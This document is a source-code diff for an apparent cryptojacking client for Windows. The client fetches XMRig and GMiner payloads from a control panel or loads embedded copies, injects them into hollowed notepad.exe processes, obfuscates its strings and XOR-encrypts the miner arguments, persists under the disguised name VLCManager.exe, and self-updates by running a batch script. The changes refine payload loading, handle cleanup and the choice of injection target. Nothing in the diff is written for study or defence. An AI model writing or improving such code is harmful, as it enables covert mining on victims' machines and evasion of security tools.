@@ -33,12 +33,21 @@
 #endif
 
 // Global variables for signal handling
-static DWORD g_cpuMinerPid = 0;
-static DWORD g_gpuMinerPid = 0;
-static HANDLE g_cpuMinerProcess = NULL;
-static HANDLE g_gpuMinerProcess = NULL;
 static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes
 static volatile bool g_shouldExit = false;  // Flag to signal exit on Ctrl+C
+
+// Closes the handles of a miner that has already been terminated and drops its
+// ProcessStorage entry. Every restart used to leak a process handle, a thread
+// handle and a map entry.
+static void close_miner_handles(std::optional<PROCESS_INFORMATION>& pi) {
+    if (!pi) return;
+
+    if (pi->hProcess) CloseHandle(pi->hProcess);
+    if (pi->hThread)  CloseHandle(pi->hThread);
+
+    ProcessStorage::RemoveProcess(pi->dwProcessId);
+    pi.reset();
+}
 
 // Signal handler for graceful shutdown
 BOOL WINAPI ConsoleHandler(DWORD signal) {
@@ -48,30 +57,10 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
         std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
 #endif
         
-        // Terminate miner processes
-        ProcessAPI procAPI;
-        if (procAPI.IsInitialized()) {
-            if (g_cpuMinerProcess != NULL) {
-                procAPI.pTerminateProcess(g_cpuMinerProcess, 0);
-                CloseHandle(g_cpuMinerProcess);
-            }
-            
-            if (g_gpuMinerProcess != NULL) {
-                procAPI.pTerminateProcess(g_gpuMinerProcess, 0);
-                CloseHandle(g_gpuMinerProcess);
-            }
-        } else {
-            // Fallback to direct API
-            if (g_cpuMinerProcess != NULL) {
-                TerminateProcess(g_cpuMinerProcess, 0);
-                CloseHandle(g_cpuMinerProcess);
-            }
-            
-            if (g_gpuMinerProcess != NULL) {
-                TerminateProcess(g_gpuMinerProcess, 0);
-                CloseHandle(g_gpuMinerProcess);
-            }
-        }
+        // Terminate every tracked miner process. ProcessStorage owns the live
+        // handles, so this can never act on a stale or already-closed handle
+        // (the old global HANDLE copies could). exit() reclaims the handles.
+        ProcessStorage::TerminateAll();
         
         // Set exit flag and terminate
         g_shouldExit = true;
@@ -112,7 +101,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         }
 
         std::string versionUrl = baseUrl + OBFUSCATE_STRING("/api/updates/current");
-        std::string response = fetchJsonFromUrl(StringToLPWSTR(versionUrl), 0);
+        std::string response = fetchJsonFromUrl(Utf8ToWide(versionUrl), 0);
         
         if (response.empty()) {
 #ifdef ENABLE_DEBUG_CONSOLE
@@ -163,7 +152,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         
         // Download update
         size_t updateSize = 0;
-        BYTE *updateBuf = downloadBinaryFromUrl(StringToLPWSTR(fullDownloadUrl), updateSize, 0);
+        BYTE *updateBuf = downloadBinaryFromUrl(Utf8ToWide(fullDownloadUrl), updateSize, 0);
         
         if (updateSize == 0 || updateBuf == nullptr) {
             std::cerr << "[-] Downloaded update file is empty or download failed" << std::endl;
@@ -180,7 +169,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to get current executable path" << std::endl;
 #endif
-            free(updateBuf);
+            free_buffer(updateBuf);
             return false;
         }
 
@@ -191,7 +180,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to get temp directory" << std::endl;
 #endif
-            free(updateBuf);
+            free_buffer(updateBuf);
             return false;
         }
 
@@ -199,7 +188,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to create temp filename" << std::endl;
 #endif
-            free(updateBuf);
+            free_buffer(updateBuf);
             return false;
         }
 
@@ -208,7 +197,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to create temp file" << std::endl;
 #endif
-            free(updateBuf);
+            free_buffer(updateBuf);
             return false;
         }
 
@@ -219,11 +208,11 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 #endif
             _CloseHandle(tempFile);
             if (_DeleteFileW) _DeleteFileW(tempPath);
-            free(updateBuf);
+            free_buffer(updateBuf);
             return false;
         }
         _CloseHandle(tempFile);
-        free(updateBuf);
+        free_buffer(updateBuf);
         
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Update written to temp file" << std::endl;
@@ -246,10 +235,16 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathStr, sizeof(tempPathStr), NULL, NULL);
         WideCharToMultiByte(CP_ACP, 0, batchPath, -1, batchPathStr, sizeof(batchPathStr), NULL, NULL);
         
-        // Create batch content
+        // Create batch content. The client may be running under a renamed image
+        // (persistence copies it to VLCManager.exe), so kill by our own image
+        // name instead of a hardcoded one.
+        std::string selfName = std::string(exePathStr);
+        size_t selfSep = selfName.find_last_of("\\/");
+        if (selfSep != std::string::npos) selfName = selfName.substr(selfSep + 1);
+
         std::string batchContent = OBFUSCATE_STRING("@echo off\n");
         batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
-        batchContent += OBFUSCATE_STRING("taskkill /f /im client.exe 2>nul\n");
+        batchContent += OBFUSCATE_STRING("taskkill /f /im \"") + selfName + OBFUSCATE_STRING("\" 2>nul\n");
         batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
         batchContent += OBFUSCATE_STRING("del /q \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
         batchContent += OBFUSCATE_STRING("move /y \"") + std::string(tempPathStr) + OBFUSCATE_STRING("\" \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
@@ -309,6 +304,32 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         std::cerr << "[-] Exception in CheckAndApplyUpdate: " << e.what() << std::endl;
         return false;
     }
+}
+
+// Loads an embedded miner payload on demand. Returns true when a payload is
+// available (already loaded, or just loaded now).
+static bool ensure_embedded_xmrig(BYTE*& buf, size_t& size) {
+    if (buf != nullptr && size > 0) return true;
+
+    try {
+        LoadEmbeddedXMRig(buf, size);
+    } catch (...) {
+        buf = nullptr;
+        size = 0;
+    }
+    return buf != nullptr && size > 0;
+}
+
+static bool ensure_embedded_gminer(BYTE*& buf, size_t& size) {
+    if (buf != nullptr && size > 0) return true;
+
+    try {
+        LoadEmbeddedGminer(buf, size);
+    } catch (...) {
+        buf = nullptr;
+        size = 0;
+    }
+    return buf != nullptr && size > 0;
 }
 
 int main(int argc, char *argv[])
@@ -379,7 +400,7 @@ int main(int argc, char *argv[])
 #endif // ENABLE_CONTRACT_URL
     
     // Client version - update this for each release
-    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.0.0");
+    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.1.0");
 
     // Prefix used when passing XOR-encrypted XMRig args to the injected process
     const std::string ENC_ARGS_PREFIX = OBFUSCATE_STRING("--encargs ");
@@ -473,13 +494,14 @@ int main(int argc, char *argv[])
     // Create mutable buffers for both miners
     wchar_t payloadPath[MAX_PATH] = {0};
     wchar_t targetPath[MAX_PATH] = {0};
-    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\cmd.exe");
+    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\notepad.exe");
     std::wstring targetStr(_targetNarrow.begin(), _targetNarrow.end());
     wcscpy_s(targetPath, MAX_PATH, targetStr.c_str());
 
 #ifdef ENABLE_REMOTE_MINERS
-    // Always load embedded miners first so we can mine immediately even if panel is offline.
-    // Remote miners will be downloaded (and will replace these) once the panel is reachable.
+    // Miner payloads are prepared only for miners that are actually enabled, and
+    // the embedded copy is loaded only when the download fails. A disabled miner
+    // must not pay for its binary (GMiner alone is ~80 MB) in RAM.
     size_t xmrigPayloadSize = 0;
     BYTE *xmrigBuf = nullptr;
     bool remoteXmrigDownloaded = false;
@@ -488,29 +510,8 @@ int main(int argc, char *argv[])
     BYTE *gminerBuf = nullptr;
     bool remoteGminerDownloaded = false;
 
-    // Load embedded XMRig as the starting point
-    try {
-        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
-#ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[+] Loaded embedded XMRig as startup fallback: " << xmrigPayloadSize << " bytes" << std::endl;
-#endif
-    } catch (...) {
-        xmrigBuf = nullptr;
-        xmrigPayloadSize = 0;
-    }
-
-    // Load embedded GMiner as the starting point
-    try {
-        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
-#ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[+] Loaded embedded GMiner as startup fallback: " << gminerPayloadSize << " bytes" << std::endl;
-#endif
-    } catch (...) {
-        gminerBuf = nullptr;
-        gminerPayloadSize = 0;
-    }
-
-    // Try to download remote miners now; if the panel is online we'll use those instead
+    // Try to download remote miners now; if the panel is offline we fall back to
+    // the embedded payloads so mining can still start.
 #ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Remote miner loading enabled - attempting download from panel..." << std::endl;
 #endif
@@ -519,7 +520,6 @@ int main(int argc, char *argv[])
         size_t remoteXmrigSize = 0;
         if (cpuConfig.enabled == 1 &&
             DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
-            if (xmrigBuf) free_buffer(xmrigBuf);
             xmrigBuf = remoteXmrig;
             xmrigPayloadSize = remoteXmrigSize;
             remoteXmrigDownloaded = true;
@@ -528,19 +528,23 @@ int main(int argc, char *argv[])
 #endif
         } else if (cpuConfig.enabled != 1) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[*] CPU mining disabled - skipping XMRig download" << std::endl;
+            std::cout << "[*] CPU mining disabled - skipping XMRig download and payload load" << std::endl;
 #endif
         } else {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cerr << "[-] Remote XMRig download failed - will retry when panel is reachable" << std::endl;
+            std::cerr << "[-] Remote XMRig download failed - using embedded fallback" << std::endl;
 #endif
+            if (ensure_embedded_xmrig(xmrigBuf, xmrigPayloadSize)) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] Loaded embedded XMRig as fallback: " << xmrigPayloadSize << " bytes" << std::endl;
+#endif
+            }
         }
 
         BYTE *remoteGminer = nullptr;
         size_t remoteGminerSize = 0;
         if (gpuConfig.enabled == 1 &&
             DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
-            if (gminerBuf) free_buffer(gminerBuf);
             gminerBuf = remoteGminer;
             gminerPayloadSize = remoteGminerSize;
             remoteGminerDownloaded = true;
@@ -549,12 +553,17 @@ int main(int argc, char *argv[])
 #endif
         } else if (gpuConfig.enabled != 1) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[*] GPU mining disabled - skipping GMiner download" << std::endl;
+            std::cout << "[*] GPU mining disabled - skipping GMiner download and payload load" << std::endl;
 #endif
         } else {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cerr << "[-] Remote GMiner download failed - will retry when panel is reachable" << std::endl;
+            std::cerr << "[-] Remote GMiner download failed - using embedded fallback" << std::endl;
 #endif
+            if (ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] Loaded embedded GMiner as fallback: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
+            }
         }
     }
 #else
@@ -563,34 +572,42 @@ int main(int argc, char *argv[])
     BYTE *xmrigBuf = nullptr;
     
 #ifdef ENABLE_CPU_MINER
-    // Load XMRig miner from embedded resource
-    try {
-        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
+    // Load XMRig miner from embedded resource (only when CPU mining is enabled)
+    if (cpuConfig.enabled == 1) {
+        try {
+            LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
 #ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
 #endif
-    } catch (const std::exception& e) {
-        std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
-        return -1;
+        } catch (const std::exception& e) {
+            std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
+            return -1;
+        }
+    } else {
+        std::cout << "[*] CPU mining disabled - skipping XMRig payload load" << std::endl;
     }
 #else
     std::cout << "[*] CPU miner not enabled in this build" << std::endl;
 #endif
 
-    // Load GMiner from embedded resource
+    // Load GMiner from embedded resource (only when GPU mining is enabled)
     size_t gminerPayloadSize = 0;
     BYTE *gminerBuf = nullptr;
     
 #ifdef ENABLE_GPU_MINER
-    try {
-        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+    if (gpuConfig.enabled == 1) {
+        try {
+            LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
 #ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
 #endif
-    } catch (const std::exception& e) {
-        std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
-        gminerBuf = nullptr;
-        gminerPayloadSize = 0;
+        } catch (const std::exception& e) {
+            std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
+            gminerBuf = nullptr;
+            gminerPayloadSize = 0;
+        }
+    } else {
+        std::cout << "[*] GPU mining disabled - skipping GMiner payload load" << std::endl;
     }
 #else
     std::cout << "[*] GPU miner not enabled in this build" << std::endl;
@@ -626,7 +643,7 @@ int main(int argc, char *argv[])
 #endif
         } else {
             cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                StringToLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername)));
+                ScopedLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername)));
             Sleep(500);
             cpuPi = ProcessStorage::GetProcess(cpuPid);
             if (cpuPid != 0) {
@@ -670,7 +687,7 @@ int main(int argc, char *argv[])
             std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
 #endif
             
-            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
             Sleep(500);  // Give system time to stabilize after injection
             gpuPi = ProcessStorage::GetProcess(gpuPid);
             
@@ -703,11 +720,6 @@ int main(int argc, char *argv[])
     }
 #endif
 
-    // Store global PIDs and handles for signal handler
-    g_cpuMinerPid = cpuPid;
-    g_gpuMinerPid = gpuPid;
-    if (cpuPi) g_cpuMinerProcess = cpuPi->hProcess;
-    if (gpuPi) g_gpuMinerProcess = gpuPi->hProcess;
     int checkInCounter = 0;
     int updateCheckCounter = 0;
     int idlePrintCounter = 0;
@@ -803,17 +815,21 @@ int main(int argc, char *argv[])
                                 TerminateProcess(cpuPi.value().hProcess, 0);
                                 WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                             }
+                            close_miner_handles(cpuPi);
                             cpuPid = 0;
-                            cpuPi.reset();
                         }
                         
-                        // Restart CPU miner if enabled
-                        if (newCpuConfig.enabled == 1) {
+                        // Restart CPU miner if enabled. CPU mining may have been
+                        // disabled at startup, so the payload is loaded only when
+                        // it is first needed; without a payload there is nothing to
+                        // start, and any running miner keeps its old config.
+                        if (newCpuConfig.enabled == 1 &&
+                            ensure_embedded_xmrig(xmrigBuf, xmrigPayloadSize)) {
                             bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
                             std::string newCpuCommand = configManager.BuildCommandLineArgs(newCpuConfig, newCpuIsIdle);
                             std::string encNewCpuArgs = ENC_ARGS_PREFIX + XorEncryptToHex(newCpuCommand, pcUsername);
                             cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                                StringToLPWSTR(encNewCpuArgs));
+                                ScopedLPWSTR(encNewCpuArgs));
                             cpuPi = ProcessStorage::GetProcess(cpuPid);
 #ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[+] CPU miner restarted, PID: " << cpuPid << std::endl;
@@ -840,12 +856,13 @@ int main(int argc, char *argv[])
                                 TerminateProcess(gpuPi.value().hProcess, 0);
                                 WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                             }
+                            close_miner_handles(gpuPi);
                             gpuPid = 0;
-                            gpuPi.reset();
                         }
                         
                         // Restart GPU miner if enabled
-                        if (newGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
+                        if (newGpuConfig.enabled == 1 &&
+                            ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
                             std::string gminer_args = GMINER_ALGO + getAlgoMapping(newGpuConfig.algo);
                             { const std::string p = getPersString(newGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
                             gminer_args += GMINER_SERVER + newGpuConfig.mining_url;
@@ -857,7 +874,7 @@ int main(int argc, char *argv[])
                             }
                             gminer_args += GMINER_API;
                             
-                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                             gpuPi = ProcessStorage::GetProcess(gpuPid);
 #ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[+] GPU miner restarted, PID: " << gpuPid << std::endl;
@@ -870,7 +887,9 @@ int main(int argc, char *argv[])
                 // When the panel is reachable, try to swap in the remote miner binaries
                 // (we may have started with the embedded fallback)
                 if (panelOnline) {
-                    if (!remoteXmrigDownloaded) {
+                    // Never download a miner the panel has disabled: the swap stays
+                    // pending until (and unless) that miner gets enabled.
+                    if (configManager.GetCPUConfig().enabled == 1 && !remoteXmrigDownloaded) {
                         BYTE *remoteXmrig = nullptr;
                         size_t remoteXmrigSize = 0;
                         if (DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
@@ -888,9 +907,7 @@ int main(int argc, char *argv[])
                                     TerminateProcess(cpuPi.value().hProcess, 0);
                                     WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                                 }
-                                CloseHandle(cpuPi.value().hProcess);
-                                CloseHandle(cpuPi.value().hThread);
-                                cpuPi.reset();
+                                close_miner_handles(cpuPi);
                                 cpuPid = 0;
                             }
                             if (xmrigBuf) free_buffer(xmrigBuf);
@@ -901,13 +918,13 @@ int main(int argc, char *argv[])
                                 bool isIdle = IsDeviceIdle(configManager.GetCPUConfig().wait_time_idle);
                                 std::string cmd = configManager.BuildCommandLineArgs(configManager.GetCPUConfig(), isIdle);
                                 cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                                    StringToLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cmd, pcUsername)));
+                                    ScopedLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cmd, pcUsername)));
                                 cpuPi = ProcessStorage::GetProcess(cpuPid);
                                 lastCpuConfig = configManager.GetCPUConfig();
                             }
                         }
                     }
-                    if (!remoteGminerDownloaded) {
+                    if (configManager.GetGPUConfig().enabled == 1 && !remoteGminerDownloaded) {
                         BYTE *remoteGminer = nullptr;
                         size_t remoteGminerSize = 0;
                         if (DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
@@ -924,9 +941,7 @@ int main(int argc, char *argv[])
                                     TerminateProcess(gpuPi.value().hProcess, 0);
                                     WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                                 }
-                                CloseHandle(gpuPi.value().hProcess);
-                                CloseHandle(gpuPi.value().hThread);
-                                gpuPi.reset();
+                                close_miner_handles(gpuPi);
                                 gpuPid = 0;
                             }
                             if (gminerBuf) free_buffer(gminerBuf);
@@ -944,7 +959,7 @@ int main(int argc, char *argv[])
                                     gminer_args += GMINER_FAN + std::to_string(gc.fan_speed);
                                 }
                                 gminer_args += GMINER_API;
-                                gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                                gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                                 gpuPi = ProcessStorage::GetProcess(gpuPid);
                                 lastGpuConfig = gc;
                             }
@@ -982,9 +997,7 @@ int main(int argc, char *argv[])
                 if (cpuPi) {
                     TerminateProcess(cpuPi.value().hProcess, 0);
                     WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
-                    CloseHandle(cpuPi.value().hProcess);
-                    CloseHandle(cpuPi.value().hThread);
-                    cpuPi.reset();
+                    close_miner_handles(cpuPi);
                     cpuPid = 0;
                 }
                 
@@ -993,7 +1006,7 @@ int main(int argc, char *argv[])
                     std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                     std::string encIdleArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername);
                     cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                        StringToLPWSTR(encIdleArgs));
+                        ScopedLPWSTR(encIdleArgs));
                     cpuPi = ProcessStorage::GetProcess(cpuPid);
 #ifdef ENABLE_DEBUG_CONSOLE
                     std::cout << "[+] CPU miner restarted, PID: " << cpuPid << std::endl;
@@ -1003,12 +1016,14 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[!] CPU miner crashed, restarting" << std::endl;
 #endif
-                // Restart if CPU is still enabled
+                // Restart if CPU is still enabled. The miner is already dead, but
+                // its handles and storage entry still have to be released.
+                close_miner_handles(cpuPi);
                 if (lastCpuConfig.enabled == 1) {
                     std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                     std::string encRestartArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername);
                     cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                        StringToLPWSTR(encRestartArgs));
+                        ScopedLPWSTR(encRestartArgs));
                     cpuPi = ProcessStorage::GetProcess(cpuPid);
                 }
             } else {
@@ -1028,6 +1043,7 @@ int main(int argc, char *argv[])
                 std::cout << "[!] GPU miner crashed, restarting" << std::endl;
 #endif
                 // Restart if GPU is still enabled
+                close_miner_handles(gpuPi);
                 if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                     std::string gminer_args = GMINER_ALGO + getAlgoMapping(lastGpuConfig.algo);
                     { const std::string p = getPersString(lastGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
@@ -1037,7 +1053,7 @@ int main(int argc, char *argv[])
                     gminer_args += (lastGpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
                     gminer_args += GMINER_API;
                     
-                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                     gpuPi = ProcessStorage::GetProcess(gpuPid);
                 }
             } else {
